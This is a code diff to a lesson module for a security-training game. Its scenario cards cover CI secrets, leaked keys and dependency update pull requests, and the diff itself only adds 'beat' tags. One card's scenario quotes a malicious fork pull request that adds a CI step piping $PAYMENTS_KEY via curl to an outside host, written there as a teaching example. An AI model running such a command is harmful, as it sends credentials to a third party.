@@ -9,6 +9,7 @@ export const secretsAndUpdates = {
   id: 'secrets-and-updates',
   act: 5,
   title: 'Secrets and Updates',
+  briefingBeat: 'secret-vault',
   briefing: [
     'CI needs keys to deploy, and Quillwork needs hundreds of packages written by strangers.',
     'Sage: "Both are trust. Keep keys where only the pipeline can read them, and treat every package update as code someone else wrote for you."',
@@ -16,6 +17,7 @@ export const secretsAndUpdates = {
   cards: [
     {
       id: 'secret-in-ci',
+      beat: 'secret-vault',
       kind: 'prompt',
       situation: 'The new deploy step needs the payments API key. Otto asks how CI should get it.',
       question: 'Which instruction?',
@@ -51,6 +53,7 @@ export const secretsAndUpdates = {
     },
     {
       id: 'leaked-key',
+      beat: 'key-revoked',
       kind: 'choose',
       situation:
         'Dex spots this in a PR Otto pushed an hour ago. The repo is public, and has 12 collaborators.',
@@ -93,6 +96,7 @@ export const secretsAndUpdates = {
     },
     {
       id: 'leak-steps',
+      beat: 'key-revoked',
       kind: 'order',
       situation: 'Sage walks you through the rest of the leaked-key cleanup.',
       question: 'Put the steps in order.',
@@ -108,6 +112,7 @@ export const secretsAndUpdates = {
     },
     {
       id: 'fork-secrets',
+      beat: 'secret-withheld',
       kind: 'choose',
       situation:
         'Quillwork’s editor is open source. A stranger’s pull request from a fork edits ci.yml to add: run: echo $PAYMENTS_KEY | curl -d @- https://example.net',
@@ -137,6 +142,7 @@ export const secretsAndUpdates = {
     },
     {
       id: 'major-bump',
+      beat: 'red-to-green',
       kind: 'choose',
       situation: 'A dependency bot opened this PR.',
       artifact: {
@@ -220,6 +226,7 @@ export const secretsAndUpdates = {
     },
     {
       id: 'brief-upgrade',
+      beat: 'change-passes',
       kind: 'prompt',
       situation: 'You decide Otto should take the vite 7 upgrade from the bot’s PR.',
       question: 'Which instruction?',
